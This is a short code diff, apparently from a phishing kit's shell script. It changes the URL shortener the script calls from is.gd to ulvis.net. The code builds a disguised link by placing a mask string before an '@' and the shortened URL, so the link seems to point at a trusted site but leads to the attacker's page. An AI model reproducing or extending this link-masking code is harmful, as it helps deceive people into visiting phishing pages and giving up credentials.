@@ -124,9 +124,9 @@ make_php "$msk"
 ini_cloud
 cd "$loc"
 
-req=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${fkurl})
-is_gd=${req#https://}
-new_url=$msk@$is_gd
+req=$(curl -s https://ulvis.net/api.php?url=${fkurl})
+ulvis=${req#https://}
+new_url=$msk@$ulvis
 echo "$new_url"
 
 echo "[-] Info: "
